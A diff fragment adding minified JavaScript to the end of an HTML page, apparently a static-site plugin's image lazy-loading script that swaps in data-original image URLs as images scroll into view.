+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>
